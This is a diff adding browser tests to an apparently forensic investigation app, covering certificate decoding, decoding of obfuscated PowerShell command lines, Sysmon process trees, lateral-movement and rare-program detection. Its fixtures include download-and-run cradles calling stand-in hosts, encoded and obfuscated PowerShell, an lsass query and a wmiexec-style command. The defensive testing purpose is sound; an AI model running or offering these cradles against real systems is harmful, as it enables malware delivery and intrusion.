@@ -740,3 +740,689 @@ test('a note from selected events: a plain-words summary, the chronology with ci
   await expect(page.locator('.note-card:has-text("Initial access to C2") .ncite')).toHaveCount(3);
   noErrors(errors);
 });
+
+test('certificates and signing requests: expiry, full serial and thumbprints up front, checked against an independent hash; decoded in evidence, with thumbprints and names becoming indicators', async ({ page }) => {
+  const fs = require('fs'), crypto = require('crypto'), der = f => Buffer.from(fs.readFileSync('tests/fixtures/certs/' + f, 'utf8').replace(/-----[^-]+-----/g, '').replace(/\s+/g, ''), 'base64');
+  const H = (f, a) => crypto.createHash(a).update(der(f)).digest('hex').toUpperCase();
+  const errors = await open(page, '#/certs');
+  await page.evaluate(t => { cxLoad(t); renderMain(); }, fs.readFileSync('tests/fixtures/certs/leaf-phish.pem', 'utf8'));
+  const facts = page.locator('.cxf').first();
+  await expect(facts).toContainText(H('leaf-phish.pem', 'sha1'));                      // Windows-style thumbprint
+  await expect(facts).toContainText(H('leaf-phish.pem', 'sha256').replace(/(..)(?=.)/g, '$1:'));
+  await expect(facts).toContainText('Expires'); await expect(facts).toContainText('2027-01-27'); await expect(facts).toContainText(/Valid — \d+ days left/);
+  await expect(facts).toContainText('17:54:6D:F5:96:32:5F:95:1F:94:61:23:26:BF:0E:2D:51:C4:EB:E4');   // the whole serial, not cut short
+  await expect(facts).toContainText('OCSP http://ocsp.example-trust.test');
+  // copy gives the plain hex the tools expect
+  const copied = await page.evaluate(() => { let v = null; const o = window.copyText; window.copyText = x => { v = x; }; document.querySelector('.cxf [aria-label="Copy Thumbprint SHA-1"]').click(); window.copyText = o; return v; });
+  expect(copied).toBe(H('leaf-phish.pem', 'sha1'));
+  // a signing request: its own thumbprints, every subject part, the challenge password in full
+  await page.evaluate(t => { cxLoad(t); renderMain(); }, fs.readFileSync('tests/fixtures/certs/request.csr', 'utf8'));
+  const q = page.locator('.crt-csr .cxf');
+  await expect(q).toContainText(H('request.csr', 'sha1')); await expect(q).toContainText('PKCS#10 v1');
+  await expect(q).toContainText('Organisation'); await expect(q).toContainText('Acme Industries Ltd'); await expect(q).toContainText('Country');
+  await expect(q).toContainText('notsecret');
+  // an expired certificate pasted into a case: decoded in the evidence panel, and it gives the case indicators
+  await page.evaluate(t => { DB.active = 'c-lantern'; DB.records.push({ id: 'r-pem', caseId: 'c-lantern', type: 'evidence', title: 'cert from the VPN', body: 'seen on the VPN:\n' + t, ts: Date.now(), source: 'paste', host: '', tags: [], ents: [], addedAt: Date.now() }); mutate('pasted a certificate');
+    UI.sel = { kind: 'rec', id: 'r-pem' }; UI.inspOpen = true; go(caseHash('c-lantern', 'timeline')); }, fs.readFileSync('tests/fixtures/certs/expired.pem', 'utf8'));
+  const dec = page.locator('#insp .cx-rec');
+  await expect(dec).toContainText('Expired'); await expect(dec).toContainText(H('expired.pem', 'sha1'), { timeout: 10000 });
+  await expect.poll(() => page.evaluate(() => DB.records.find(r => r.id === 'r-pem').ents.map(e => e.k)), { timeout: 10000 }).toEqual(expect.arrayContaining(['sha256', 'sha1', 'domain']));
+  expect(await page.evaluate(h => derive('c-lantern').ents.has('sha1:' + h.toLowerCase()), H('expired.pem', 'sha1'))).toBe(true);
+  await dec.locator('[data-act=cxDecodeRec]').click();
+  await expect(page).toHaveURL(/#\/certs/); await expect(page.locator('.cxf').first()).toContainText(H('expired.pem', 'sha1'));
+  // a chain in one record: each certificate decoded; a hostile certificate shows as text
+  await page.evaluate(t => { DB.records.push({ id: 'r-chain', caseId: 'c-lantern', type: 'evidence', title: 'chain', body: t, ts: Date.now(), source: 'paste', host: '', tags: [], ents: [], addedAt: Date.now() }); rev++; UI.sel = { kind: 'rec', id: 'r-chain' }; UI.inspOpen = true; go(caseHash('c-lantern', 'timeline')); },
+    fs.readFileSync('tests/fixtures/certs/chain-phish.pem', 'utf8') + '\n' + fs.readFileSync('tests/fixtures/certs/hostile.pem', 'utf8'));
+  await expect(page.locator('#insp .cx-rec .cx-rec-h')).toHaveCount(3);                 // the two in the chain and the hostile one
+  await expect(page.locator('#insp .cx-rec img, #insp .cx-rec script')).toHaveCount(0);
+  noErrors(errors);
+});
+
+// endpoint evidence: decoded command lines, process trees, lateral movement, rare things
+const u16 = s => Buffer.from(s, 'utf16le').toString('base64'), u8 = s => Buffer.from(s, 'utf8').toString('base64');
+
+test('command lines: -enc, FromBase64String, [char] codes, joined strings, backticks and nesting are decoded; everyday command lines and hashes are left alone', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const inner = "IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.example/a.ps1')";
+  const C = {
+    enc: `powershell.exe -NoP -NonI -W Hidden -Enc ${u16(inner)}`,
+    e: `powershell -e ${u16('whoami /all')}`,
+    quoted: `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -EncodedCommand "${u16('Get-Process lsass')}"`,
+    fb64: `powershell -c "$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${u8('Invoke-WebRequest http://203.0.113.200/x.exe -OutFile C:\\ProgramData\\x.exe')}'));iex $s"`,
+    chararr: `powershell -c "iex ([char[]](73,69,88,32,40,103,99,105,41) -join '')"`,
+    charplus: `powershell -c "&([char]73+[char]69+[char]88) 'calc'"`,
+    concat: `powershell -c "(New-Object Net.WebClient).('Down'+'load'+'String')('http://'+'evil-cdn'+'.example/p')"`,
+    tick: 'powershell -c "I`E`X (N`ew-Ob`je`ct Net.WebClient).Downl`oadString(\'http://tick.example/z\')"',
+    nested: `powershell -enc ${u16(`$x=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${u8('Start-Process C:\\Users\\Public\\beacon.exe')}'));iex $x`)}`,
+  };
+  const N = {
+    git: '"C:\\Program Files\\Git\\cmd\\git.exe" commit -m "fix login + logout"',
+    hash: 'certutil -hashfile C:\\Temp\\setup.exe SHA256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
+    guid: 'msiexec.exe /i {7C23E0B4-5A0E-4C8B-9C3A-1F5D2B3E4A6F} /qn',
+    path: 'C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule',
+    tab: 'powershell -c "Write-Host `tIndented`n"',
+  };
+  const R = await page.evaluate(({ C, N }) => ({ hit: Object.fromEntries(Object.entries(C).map(([k, v]) => [k, cmdDecode(v).map(s => [s.how, s.out])])), miss: Object.fromEntries(Object.entries(N).map(([k, v]) => [k, cmdDecode(v).length])) }), { C, N });
+  const last = k => R.hit[k][R.hit[k].length - 1][1];
+  expect(R.hit.enc[0][0]).toMatch(/EncodedCommand/); expect(last('enc')).toBe(inner);
+  expect(last('e')).toBe('whoami /all');
+  expect(last('quoted')).toBe('Get-Process lsass');
+  expect(R.hit.fb64[0][0]).toBe('FromBase64String'); expect(last('fb64')).toContain('http://203.0.113.200/x.exe');
+  expect(last('chararr')).toBe('IEX (gci)');
+  expect(last('charplus')).toContain('"IEX"');
+  expect(last('concat')).toContain('"DownloadString"'); expect(last('concat')).toContain('"http://evil-cdn.example/p"');
+  expect(last('tick')).toContain("IEX (New-Object Net.WebClient).DownloadString('http://tick.example/z')");
+  expect(R.hit.nested.map(x => x[0])).toEqual(['-EncodedCommand (Base64, UTF-16)', 'FromBase64String']); expect(last('nested')).toBe('Start-Process C:\\Users\\Public\\beacon.exe');
+  expect(R.miss).toEqual({ git: 0, hash: 0, guid: 0, path: 0, tab: 0 });
+
+  // in a case: the decoded text gives its indicators to the event, and the evidence panel shows it decoded
+  const S = await page.evaluate(async ({ C }) => {
+    DB.cases.push({ id: 'c-dec', code: 'DE-1', name: 'Decode', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const r = { id: 'r-dec1', caseId: 'c-dec', type: 'evidence', title: 'Process created', body: `EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="${C.enc}"`, ts: Date.UTC(2024, 4, 2, 9), tsRaw: '', tsZone: 'explicit', source: 'sysmon', host: 'WS-1', tags: [], ents: [], addedAt: Date.now() };
+    r.ents = extractRich(r.body); const before = r.ents.some(e => e.v === 'cdn-sync.example');
+    DB.records.push(r); mutate('add'); await new Promise(res => setTimeout(res, 900));
+    const D = derive('c-dec'); return { before, after: [...D.ents.values()].filter(e => /cdn-sync/.test(e.v)).map(e => e.k + ':' + e.v).sort() };
+  }, { C });
+  expect(S.before).toBe(false);
+  expect(S.after).toEqual(['domain:cdn-sync.example', 'url:http://cdn-sync.example/a.ps1']);
+  await page.evaluate(() => { DB.active = 'c-dec'; UI.tlMode = 'events'; UI.sel = { kind: 'rec', id: 'r-dec1' }; UI.inspOpen = true; go(caseHash('c-dec', 'timeline')); });
+  await expect(page.locator('.isec', { hasText: 'Command line, decoded' })).toContainText("DownloadString('http://cdn-sync.example/a.ps1')");
+  noErrors(errors);
+});
+
+test('process trees from a real Sysmon XML export and 4688 events: joined by GUID, by hex process ID, by parent path; a reused path does not cross instances; suspicious branches stand out', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const enc = u16("IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.example/a.ps1')");
+  const R = await page.evaluate(({ enc }) => {
+    const x = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+    const ev = (id, t, host, d) => `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="${id > 1000 ? 'Microsoft-Windows-Security-Auditing' : 'Microsoft-Windows-Sysmon'}"/><EventID>${id}</EventID><TimeCreated SystemTime="2024-05-02T${t}.000Z"/><Computer>${host}</Computer></System><EventData>${Object.entries(d).map(([k, v]) => `<Data Name="${k}">${x(v)}</Data>`).join('')}</EventData></Event>`;
+    const W = 'ws-hr-03.corp.local', sm = (t, g, pid, img, pg, ppid, pimg, cmd) => ev(1, t, W, { ProcessGuid: g, ProcessId: pid, Image: img, CommandLine: cmd || img, ParentProcessGuid: pg, ParentProcessId: ppid, ParentImage: pimg, User: 'CORP\\amy' });
+    const EX = 'C:\\Windows\\explorer.exe', WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', CMD = 'C:\\Windows\\System32\\cmd.exe', PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
+    const xml = '<Events>' + [
+      sm('08:59:00', '{A1}', 4012, EX, '{A0}', 3900, 'C:\\Windows\\System32\\userinit.exe'),
+      sm('09:00:00', '{B1}', 5120, WORD, '{A1}', 4012, EX, `"${WORD}" /n "C:\\Users\\amy\\Downloads\\Payroll_Q3.docm"`),
+      sm('09:00:40', '{C1}', 6200, CMD, '{B1}', 5120, WORD, `cmd.exe /c powershell -nop -w hidden -enc ${enc}`),
+      sm('09:00:41', '{D1}', 6240, PS, '{C1}', 6200, CMD, `powershell -nop -w hidden -enc ${enc}`),
+      sm('09:01:10', '{E1}', 7000, 'C:\\Windows\\System32\\rundll32.exe', '{D1}', 6240, PS, 'rundll32.exe C:\\ProgramData\\upd.dll,Start'),
+      sm('09:02:00', '{F1}', 7100, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', '{A1}', 4012, EX),
+      // a second Explorer (another sign-in): its notepad must hang under it, not under the first one with the same path
+      sm('09:05:00', '{A2}', 8100, EX, '{A9}', 8000, 'C:\\Windows\\System32\\userinit.exe'),
+      sm('09:06:00', '{G1}', 8200, 'C:\\Windows\\System32\\notepad.exe', '{A1}', 4012, EX),
+      sm('09:06:30', '{G2}', 8300, 'C:\\Windows\\System32\\notepad.exe', '{A2}', 8100, EX),
+      // Windows 4688 on the DC: hex IDs, a shell under services.exe writing to ADMIN$ (wmiexec / smbexec style)
+      ev(4688, '09:20:00', 'DC01.corp.local', { NewProcessId: '0x1a2c', NewProcessName: CMD, ProcessId: '0x2a4', ParentProcessName: 'C:\\Windows\\System32\\services.exe', CommandLine: 'cmd.exe /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > C:\\Windows\\TEMP\\execute.bat', SubjectUserName: 'DC01$' }),
+      ev(4688, '09:20:01', 'DC01.corp.local', { NewProcessId: '0x1b00', NewProcessName: 'C:\\Windows\\System32\\whoami.exe', ProcessId: '0x1a2c', ParentProcessName: CMD, CommandLine: 'whoami', SubjectUserName: 'DC01$' }),
+      // PID reuse: a later cmd.exe with the same ID, started long after, must not adopt children of the first
+      ev(4688, '15:00:00', 'DC01.corp.local', { NewProcessId: '0x1a2c', NewProcessName: CMD, ProcessId: '0x300', ParentProcessName: EX, CommandLine: 'cmd.exe', SubjectUserName: 'admin' }),
+      ev(4688, '15:00:05', 'DC01.corp.local', { NewProcessId: '0x1c00', NewProcessName: 'C:\\Windows\\System32\\ipconfig.exe', ProcessId: '0x1a2c', ParentProcessName: CMD, CommandLine: 'ipconfig /all', SubjectUserName: 'admin' }),
+    ].join('\n') + '</Events>';
+    DB.cases.push({ id: 'c-pt', code: 'PT-1', name: 'Trees', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const P = logParse(xml, 'sec.xml'), cols = [...new Set(P.rows.slice(0, 200).flatMap(r => Object.keys(r)))], M = { time: logGuess(cols, 'time'), title: logGuess(cols, 'title'), host: logGuess(cols, 'host'), source: logGuess(cols, 'source') };
+    for(const row of P.rows){ const r = logRec(row, M, 'sec.xml'); r.caseId = 'c-pt'; DB.records.push(r); } mutate('import');
+    const H = epTrees(derive('c-pt')), b = n => n.image.split('\\').pop().toLowerCase();
+    const shape = n => b(n) + (n.synthetic ? '?' : '') + (n.kids.length ? '(' + n.kids.map(shape).join(',') + ')' : '');
+    const flags = []; const walk = n => { if(n.why && n.why.length) flags.push(b(n) + ': ' + n.why.join(' | ')); n.kids.forEach(walk); }; H.forEach(h => h.roots.forEach(walk));
+    const hot = []; const w2 = n => { if(n.hot) hot.push(b(n)); n.kids.forEach(w2); }; H.forEach(h => h.roots.forEach(w2));
+    return { hosts: H.map(h => [h.host, h.n, h.roots.map(shape).join(' ; ')]), flags, hot, n: P.rows.length };
+  }, { enc });
+  expect(R.n).toBe(13);
+  expect(R.hosts).toEqual([
+    ['WS-HR-03', 9, 'userinit.exe?(explorer.exe(winword.exe(cmd.exe(powershell.exe(rundll32.exe))),chrome.exe,notepad.exe),explorer.exe(notepad.exe))'],
+    ['DC01', 4, 'services.exe?(cmd.exe(whoami.exe)) ; explorer.exe?(cmd.exe(ipconfig.exe))'],
+  ]);
+  const f = R.flags.join('\n');
+  expect(f).toMatch(/cmd\.exe: .*WINWORD\.EXE started cmd\.exe/);
+  expect(f).toMatch(/powershell\.exe: .*(ncoded|bfuscated)/i);
+  expect(f).toMatch(/rundll32\.exe: .*signed Windows program/i);
+  expect(f).toMatch(/cmd\.exe: .*a shell under services\.exe/);
+  expect(f).not.toMatch(/chrome|notepad|ipconfig|explorer|whoami/);
+  // the hot path is the chain to the suspicious processes, not the quiet siblings
+  expect(R.hot).toEqual(expect.arrayContaining(['userinit.exe', 'explorer.exe', 'winword.exe', 'cmd.exe', 'powershell.exe', 'rundll32.exe', 'services.exe']));
+  expect(R.hot).not.toContain('chrome.exe'); expect(R.hot).not.toContain('notepad.exe');
+
+  await page.evaluate(() => { DB.active = 'c-pt'; UI.tlMode = 'procs'; UI.epOnly = true; go(caseHash('c-pt', 'timeline')); });
+  const ws = page.locator('.ep-h', { hasText: 'WS-HR-03' });
+  await expect(ws.locator('li.flag')).toHaveCount(3);
+  await expect(ws).not.toContainText('chrome.exe'); await expect(ws).toContainText('2 quiet branches hidden');
+  await expect(ws.locator('.ep-dec').first()).toContainText("DownloadString('http://cdn-sync.example/a.ps1')");
+  await page.click('[data-act=epOnly][data-v="0"]');
+  await expect(ws).toContainText('chrome.exe'); await expect(ws.locator('.ep-b', { hasText: 'notepad.exe' })).toHaveCount(2);
+  await ws.locator('.ep-b', { hasText: 'rundll32.exe' }).click();
+  expect(await page.evaluate(() => [UI.tlMode, recById(UI.sel.id).body.includes('upd.dll')])).toEqual(['events', true]);
+  noErrors(errors);
+});
+
+test('lateral movement: network and RDP logons, PsExec, RDP and explicit-credential records and SMB connections become host → host moves, with addresses named; local, interactive and self logons do not', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const R = await page.evaluate(() => {
+    DB.cases.push({ id: 'c-mv', code: 'MV-1', name: 'Moves', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const T = Date.UTC(2024, 4, 2, 9), M = 6e4; let i = 0;
+    const mk = (host, t, body, source) => DB.records.push({ id: 'r-mv' + (i++), caseId: 'c-mv', type: 'evidence', title: body.slice(0, 40), body, ts: T + t * M, tsRaw: '', tsZone: 'explicit', source: source || 'winlog', host, tags: [], ents: extractRich(body), addedAt: Date.now() });
+    // WS-HR-03's own connections give its address; FS01's address comes from a logon that names it
+    mk('WS-HR-03', 0, 'EventID=3 Image=C:\\Windows\\System32\\svchost.exe SourceIp=10.1.2.15 SourcePort=50111 DestinationIp=10.1.0.10 DestinationPort=53', 'sysmon');
+    mk('FS01.corp.local', 1, 'EventID=4624 LogonType=3 TargetUserName=adm_x IpAddress=10.1.2.15 WorkstationName=- LogonProcessName=NtLmSsp');
+    mk('FS01.corp.local', 2, 'EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe ServiceType=user mode service StartType=demand start AccountName=LocalSystem');
+    mk('WS-HR-03', 3, 'EventID=4648 SubjectUserName=amy TargetUserName=adm_x TargetServerName=FS01.corp.local ProcessName=C:\\Windows\\System32\\net.exe');
+    mk('WS-HR-03', 4, 'EventID=3 Image=System SourceIp=10.1.2.15 SourcePort=50200 DestinationIp=10.1.5.20 DestinationPort=445 Protocol=tcp', 'sysmon');
+    mk('DC01', 10, 'EventID=4624 LogonType=3 TargetUserName=adm_x IpAddress=10.1.5.20 WorkstationName=FS01');
+    mk('DC01', 12, 'EventID=1149 Param1=adm_x Param2=CORP Param3=10.1.5.20', 'rdp');
+    mk('DC01', 13, 'EventID=4624 LogonType=10 TargetUserName=adm_x IpAddress=10.1.5.20 WorkstationName=FS01');
+    mk('DC01', 14, 'EventID=4624 LogonType=3 TargetUserName=adm_x IpAddress=10.1.5.20 WorkstationName=FS01');
+    mk('BACKUP01', 20, 'EventID=4624 LogonType=3 TargetUserName=scanner IpAddress=198.51.100.77 WorkstationName=-');
+    // not movement: interactive, service and loopback logons, a host logging on to itself
+    mk('DC01', 30, 'EventID=4624 LogonType=2 TargetUserName=admin IpAddress=127.0.0.1 WorkstationName=DC01');
+    mk('DC01', 31, 'EventID=4624 LogonType=3 TargetUserName=DC01$ IpAddress=::1 WorkstationName=-');
+    mk('DC01', 32, 'EventID=4624 LogonType=3 TargetUserName=DC01$ IpAddress=10.1.0.10 WorkstationName=DC01');
+    mk('DC01', 33, 'EventID=4624 LogonType=5 TargetUserName=SYSTEM IpAddress=- WorkstationName=-');
+    rev++; cache = {};
+    const X = epMoves(derive('c-mv'));
+    return { edges: X.edges.map(e => [e.a, e.b, e.how, (e.first - T) / M, e.n, [...e.users].join(',')]), nodes: X.nodes.map(n => n.h) };
+  });
+  expect(R.edges).toEqual([
+    ['WS-HR-03', 'FS01', 'network logon', 1, 1, 'adm_x'],
+    ['WS-HR-03', 'FS01', 'remote service (PsExec-style)', 2, 1, 'adm_x'],
+    ['WS-HR-03', 'FS01', 'explicit credentials', 3, 1, 'adm_x'],
+    ['WS-HR-03', 'FS01', 'SMB connection', 4, 1, ''],
+    ['FS01', 'DC01', 'network logon', 10, 2, 'adm_x'],
+    ['FS01', 'DC01', 'RDP connection', 12, 1, 'adm_x'],
+    ['FS01', 'DC01', 'RDP logon', 13, 1, 'adm_x'],
+    ['198.51.100.77', 'BACKUP01', 'network logon', 20, 1, 'scanner'],
+  ]);
+  expect(R.nodes).toEqual(['WS-HR-03', 'FS01', 'DC01', '198.51.100.77', 'BACKUP01']);
+  await page.evaluate(() => { DB.active = 'c-mv'; UI.tlMode = 'moves'; go(caseHash('c-mv', 'timeline')); });
+  await expect(page.locator('.mv-t tbody tr')).toHaveCount(8);
+  await expect(page.locator('.mv-svg .mv-n')).toHaveCount(5); await expect(page.locator('.mv-svg .mv-n.ip')).toHaveCount(1);
+  await page.locator('.mv-t tbody tr', { hasText: 'RDP logon' }).locator('[data-act=mvShow]').click();
+  expect(await page.evaluate(() => [UI.tlMode, UI.facet.ids.length, recById(UI.facet.ids[0]).body.includes('LogonType=10')])).toEqual(['events', 1, true]);
+  await expect(page.locator('#tlV, .tl').first()).toBeVisible();
+  noErrors(errors);
+});
+
+test('rare things: a program, service or task seen on one host once or twice across all cases is pointed out; per-user paths and software on many hosts are not', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const R = await page.evaluate(() => {
+    for(const id of ['c-ra', 'c-rb']) DB.cases.push({ id, code: id.toUpperCase(), name: id, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const T = Date.UTC(2024, 4, 2, 9); let i = 0;
+    const mk = (caseId, host, body) => DB.records.push({ id: 'r-ra' + (i++), caseId, type: 'evidence', title: 'x', body, ts: T + i * 6e4, tsRaw: '', tsZone: 'explicit', source: 'sysmon', host, tags: [], ents: [], addedAt: Date.now() });
+    const common = ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Windows\\System32\\svchost.exe', 'C:\\Windows\\System32\\conhost.exe', 'C:\\Windows\\System32\\RuntimeBroker.exe', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'C:\\Windows\\System32\\taskhostw.exe', 'C:\\Windows\\System32\\SearchProtocolHost.exe'];
+    const hosts = ['WS-01', 'WS-02', 'WS-03', 'WS-04', 'WS-05'];
+    for(const h of hosts) for(const p of common) for(let k = 0; k < 3; k++) mk(h < 'WS-03' ? 'c-ra' : 'c-rb', h, `EventID=1 Image=${p} ParentImage=C:\\Windows\\explorer.exe`);
+    // a per-user install on every host — the user folder differs, the program is the same
+    for(const h of hosts) mk('c-rb', h, `EventID=1 Image=C:\\Users\\${h.toLowerCase()}user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe ParentImage=C:\\Windows\\explorer.exe`);
+    // the long tail: one tool, once, on one host; another twice on another host (two different cases)
+    mk('c-ra', 'WS-02', 'EventID=1 Image=C:\\Users\\bob\\AppData\\Local\\Temp\\rcl.exe ParentImage=C:\\Windows\\System32\\cmd.exe CommandLine="rcl.exe copy C:\\Finance remote:x"');
+    mk('c-rb', 'WS-04', 'EventID=1 Image=C:\\ProgramData\\AnyDesk.exe ParentImage=C:\\Windows\\System32\\cmd.exe');
+    mk('c-rb', 'WS-04', 'EventID=1 Image=C:\\ProgramData\\AnyDesk.exe ParentImage=C:\\Windows\\System32\\services.exe');
+    // three times on one host is still not "once or twice"
+    for(let k = 0; k < 3; k++) mk('c-rb', 'WS-05', 'EventID=1 Image=C:\\Tools\\backup-agent.exe ParentImage=C:\\Windows\\System32\\services.exe');
+    // services: nine ordinary ones on many hosts, one installed once
+    for(let s = 0; s < 9; s++) for(const h of hosts.slice(0, 3)) mk('c-ra', h, `EventID=7045 ServiceName=Svc${s} ImagePath=C:\\Program Files\\Vendor\\svc${s}.exe`);
+    mk('c-ra', 'WS-03', 'EventID=7045 ServiceName=WinUpdSvc ImagePath=C:\\Windows\\Temp\\wupd.exe');
+    rev++; cache = {};
+    const f = id => epRare(derive(id)).map(x => [x.kind, String(x.label).split('\\').pop(), [...x.hosts][0], x.n]);
+    return { a: f('c-ra'), b: f('c-rb') };
+  });
+  expect(R.a).toEqual([['process', 'rcl.exe', 'WS-02', 1], ['service', 'wupd.exe', 'WS-03', 1]]);
+  expect(R.b).toEqual([['process', 'AnyDesk.exe', 'WS-04', 2]]);
+  await page.evaluate(() => { DB.active = 'c-ra'; UI.tlMode = 'patterns'; go(caseHash('c-ra', 'timeline')); });
+  const card = page.locator('.tlx-c', { hasText: 'Rare things' });
+  await expect(card).toContainText('rcl.exe'); await expect(card).toContainText('Only on WS-02, once in all your evidence');
+  await expect(card).not.toContainText('Teams.exe');
+  noErrors(errors);
+});
+
+test('endpoint views stay quick on a large case: 60,000 events', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const ms = await page.evaluate(() => {
+    DB.cases.push({ id: 'c-big', code: 'BIG', name: 'Big', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const T = Date.UTC(2024, 4, 2), imgs = ['chrome.exe', 'svchost.exe', 'cmd.exe', 'powershell.exe', 'conhost.exe', 'notepad.exe', 'msedge.exe', 'teams.exe'];
+    for(let i = 0; i < 60000; i++){ const h = 'WS-' + (i % 40), k = i % 4;
+      const body = k === 0 ? `EventID=1 ProcessId=${i} ParentProcessId=${i - 4} Image=C:\\Windows\\System32\\${imgs[i % 8]} ParentImage=C:\\Windows\\explorer.exe CommandLine="${imgs[i % 8]} --x ${i}"`
+        : k === 1 ? `EventID=4624 LogonType=3 TargetUserName=u${i % 50} IpAddress=10.0.${i % 40}.5 WorkstationName=WS-${(i + 1) % 40}`
+        : k === 2 ? `EventID=3 SourceIp=10.0.${i % 40}.5 DestinationIp=10.0.${(i + 3) % 40}.5 DestinationPort=${i % 3 ? 443 : 445}` : `GET /index.html 200 user=u${i % 50} https://site${i % 300}.example/`;
+      DB.records.push({ id: 'r-big' + i, caseId: 'c-big', type: 'evidence', title: 'e' + i, body, ts: T + i * 1000, tsRaw: '', tsZone: 'explicit', source: 'x', host: h, tags: [], ents: [], addedAt: 0 }); }
+    rev++; cache = {}; const D = derive('c-big'), t0 = performance.now();
+    const H = epTrees(D), t1 = performance.now(), M = epMoves(D), t2 = performance.now(), R = epRare(D), t3 = performance.now();
+    const html = procView(theCase('c-big'), D) + moveView(theCase('c-big'), D), t4 = performance.now();
+    return { trees: t1 - t0, moves: t2 - t1, rare: t3 - t2, render: t4 - t3, hosts: H.length, edges: M.edges.length, html: html.length };
+  });
+  console.log('endpoint timings', JSON.stringify(ms));
+  expect(ms.hosts).toBe(10); expect(ms.edges).toBeGreaterThan(10);
+  expect(ms.trees + ms.moves + ms.rare + ms.render).toBeLessThan(8000);
+  noErrors(errors);
+});
+
+// file metadata: real phone, camera and office files
+const metaFix = name => require('fs').readFileSync(require('path').join(__dirname, 'fixtures/meta', name)).toString('base64');
+test('file metadata from real files: HEIC, JPEG (EXIF, XMP, IPTC), WebP, PNG, MOV, MP4, MP3, PDF (plain and compressed) and Word — checked against an independent reader', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const names = ['iphone11pro.heic', 'exif-at-eof.heic', 'iphone6-gps.jpg', 'canon-lightroom-xmp-iptc.jpg', 'fuji-iptc-gps.jpg', 'iptc-122.jpg', 'htc-desire.webp', 'exif-chunk.png', 'sd-generated.png', 'iphone6-gps.mov', 'gps.mp4', 'id3.mp3', 'libreoffice.pdf', 'objstm.pdf', 'libreoffice.docx'];
+  const files = Object.fromEntries(names.map(n => [n, metaFix(n)]));
+  const R = await page.evaluate(async files => { const out = {};
+    for(const [n, b64] of Object.entries(files)){ const M = await metaRead(Uint8Array.from(atob(b64), c => c.charCodeAt(0)), n, '');
+      const f = {}; for(const x of M.fields) if(x.g !== 'Stands out' && !(x.k in f)) f[x.k] = x.v;
+      out[n] = { fmt: M.fmt, f, gps: M.gps, taken: M.taken, flags: M.flags.map(x => x.t), people: M.people }; }
+    // broken and odd input never throws
+    const junk = [new Uint8Array(0), Uint8Array.from({ length: 5000 }, (_, i) => (i * 7919) & 255), Uint8Array.from(atob(files['iphone11pro.heic']).slice(0, 3000), c => c.charCodeAt(0)), Uint8Array.from(atob(files['gps.mp4']).slice(0, 2000), c => c.charCodeAt(0)), Uint8Array.from(atob(files['libreoffice.pdf']).slice(0, 700), c => c.charCodeAt(0))];
+    out.junk = []; for(const j of junk){ try{ const M = await metaRead(j, 'x', ''); out.junk.push(M.fields.length >= 0); }catch(e){ out.junk.push('threw ' + e.message); } }
+    return out; }, files);
+  const day = ms => new Date(ms).toISOString().replace('.000Z', 'Z');
+  // iPhone 11 Pro HEIC (independent reader: Make Apple, Model iPhone 11 Pro, Software 13.4.1, Original 2020:05:04 18:39:11, Time Zone -04:00)
+  expect(R['iphone11pro.heic']).toMatchObject({ fmt: 'HEIC picture', gps: null });
+  expect(R['iphone11pro.heic'].f).toMatchObject({ Make: 'Apple', Model: 'iPhone 11 Pro', Software: '13.4.1', Taken: '2020:05:04 18:39:11', 'Time zone (taken)': '-04:00', 'Lens model': 'iPhone 11 Pro back triple camera 4.25mm f/1.8' });
+  expect(day(R['iphone11pro.heic'].taken)).toBe('2020-05-04T22:39:11Z');                     // the local time with its zone, in UTC
+  expect(R['iphone11pro.heic'].flags.join()).not.toMatch(/Changed after/);
+  // Exif stored at the end of the HEIC file, with GPS 47° 12' 25.65" N, 106° 14' 35.18" E
+  expect(R['exif-at-eof.heic'].gps.lat).toBeCloseTo(47.207125, 5); expect(R['exif-at-eof.heic'].gps.lon).toBeCloseTo(106.243106, 5);   // the other reader rounds the seconds
+  // iPhone 6 JPEG: 51° 45' 44.67" N, 0° 19' 4.41" W, 111.26 m, facing 23° true, and iOS 8's day-of-year GPS date (259 → 16 September)
+  expect(R['iphone6-gps.jpg'].gps).toMatchObject({ lat: 51.762408, lon: -0.317892, alt: 111, dir: 23, dirRef: 'true' });
+  expect(R['iphone6-gps.jpg'].f['GPS date (UTC)']).toBe('2014:09:16');
+  expect(R['iphone6-gps.jpg'].f['Camera facing']).toBe('23° (north-east, true)');
+  expect(R['iphone6-gps.jpg'].f['Time zone (taken)']).toBe('UTC+01:00 — worked out from the GPS clock');   // 14:05 on the camera, 13:05 on the GPS clock (British Summer Time)
+  expect(day(R['iphone6-gps.jpg'].taken)).toBe('2014-09-16T13:05:12Z');
